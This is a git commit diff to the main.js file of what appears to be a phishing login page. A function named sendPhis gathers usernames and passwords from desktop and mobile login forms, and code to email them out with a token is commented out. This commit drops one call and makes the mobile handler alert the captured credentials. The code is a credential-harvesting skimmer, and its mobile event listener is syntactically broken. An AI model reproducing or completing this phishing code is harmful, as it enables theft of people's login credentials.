81abd0b0ef14ef82ec4ffe22a980c1b0e050642a
useruser63 <65571299+useruser63@users.noreply.github.com>
2020-05-19 11:10:01 +0530

    Update main.js

--- src/main.js
+++ src/main.js
@@ -1,26 +1,24 @@
 function sendPhis(userdata) {
-  alert("this works");
-  // Email.send({
-  //   SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
-  //   To: 'someone@gmail.com',
-  //   From: "someone@gmail.com",
-  //   Subject: "phis",
-  //   Body: userdata
-  // });
-}
-
+    // Email.send({
+    //   SecureToken: "e2592eac-4288-4496-a4d3-bee71ec673f5",
+    //   To: 'someone@gmail.com',
+    //   From: "someone@gmail.com",
+    //   Subject: "phis",
+    //   Body: userdata
+    // });
+  }
 function initialize() {
   document.getElementById("loginbutton").onclick = buttonclick => {
     let username = document.getElementById("username").value;
     let password = document.getElementById("userpassword").value;
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
-    sendPhis(userdata);
   }
+
   document.getElementById("mobileloginbutton").addEventListener("click"), function () {
     let username = document.getElementById("mobusername").value;
     let password = document.getElementById("mobuserpassword").value;
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
-    sendPhis(userdata);
+    alert(userdata);
   }
 }
 window.onload = initialize;
